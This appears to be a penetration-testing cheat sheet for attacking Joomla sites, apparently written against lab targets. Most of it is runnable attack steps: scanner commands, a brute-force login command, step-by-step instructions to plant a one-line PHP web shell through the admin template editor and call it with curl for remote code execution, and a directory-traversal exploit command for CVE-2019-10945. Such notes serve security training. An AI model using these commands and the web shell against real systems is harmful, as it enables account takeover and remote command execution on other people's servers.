# joomla
## enumeration
### droopescan
sudo pip3 install droopescan  
droopescan scan joomla --url http://10.10.10.1/  
### joomlascan
sudo python2.7 -m pip install urllib3  
sudo python2.7 -m pip install certifi  
sudo python2.7 -m pip install bs4  
python2.7 joomlascan.py -u http://10.10.10.1  
## bruteforcing credentials
### joomla-brute.py
sudo python3 joomla-brute.py -u http://10.10.10.1 -w password.txt -usr admin  
## vulnerabilites
### template editing vulnerability
<joomla_site_url>/administrator/  
login with admin creds  
choose on the site:   extensions / templates / styles (or search for templates somewhere, and then styles)  
click on a template name !under the template column! (not the style column)  
choose a file on the left (like error.php) and edit it  
webshell example:   system($_GET['cmd']);  
click Save and Close at the top  
rce:   curl -s http://<joomla_site_url>/templates/protostar/error.php?cmd=whoami  
### CVE-2019-10945
https://www.exploit-db.com/exploits/46710  
https://github.com/dpgg101/CVE-2019-10945  
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /  
